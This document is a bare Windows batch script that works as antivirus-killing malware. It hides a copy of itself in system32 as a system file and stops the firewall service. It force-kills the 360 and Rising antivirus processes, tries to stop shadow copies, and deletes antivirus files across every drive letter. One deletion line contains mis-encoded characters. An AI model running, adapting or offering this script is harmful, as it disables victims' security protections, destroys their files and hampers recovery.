@echo off
set s=TASKKILL
copy %0 %windir%\system32\cmd.bat
attrib %windir%\system32\cmd.bat +r +s +h
net stop sharedaccess >nul
%s% /im 360* /f >nul
%s% /im RStray /f >nul
net stop Shadow" "System" "Service
set alldrive=d e f g h i j k l m n o p q r s t u v w x y z
for %%a in (c %alldrive%) do del %%a:\360* /f /s /q >nul
for %%a in (c %alldrive%) do del %%a:\ÐÞ¸´* /f /s /q >nul
for %%a in (c %alldrive%) do del %%a:\RStray* /f /s /q >nul
